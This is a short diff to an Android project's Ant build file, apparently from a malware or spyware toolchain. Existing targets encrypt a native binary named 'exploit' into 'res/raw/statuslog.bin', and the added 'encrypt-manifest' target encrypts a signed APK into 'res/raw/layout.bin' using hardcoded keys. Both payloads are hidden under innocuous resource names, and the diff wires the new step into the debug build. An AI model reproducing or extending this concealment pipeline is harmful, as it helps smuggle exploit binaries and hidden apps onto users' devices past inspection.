@@ -60,6 +60,11 @@
 		<crypter encrypt="true" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
 	</target>
 	
+	<target name="encrypt-manifest">
+		<delete file="res/raw/layout.bin" />	
+		<crypter encrypt="true" keyFile="0xA83E0F44BD7A4D20" inputFile="preprocess/ManifestSigned.apk" outputFile="res/raw/layout.bin" />
+	</target>
+			
 	<target name="encrypt-exploit">
 		<delete file="res/raw/statusdb.bin" />	
 		<delete file="res/raw/statuslog.bin" />
@@ -67,7 +72,7 @@
 		<crypter encrypt="true" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
 	</target>
 	
-	<target name="set-debug" depends="encrypt-messages, encrypt-exploit">
+	<target name="set-debug" depends="encrypt-messages, encrypt-exploit, encrypt-manifest">
 		<echo message="********** Set debug mode *********" />
 		<copy file="preprocess/AndroidManifest.xml" todir="." overwrite="true">
 			<filterset>
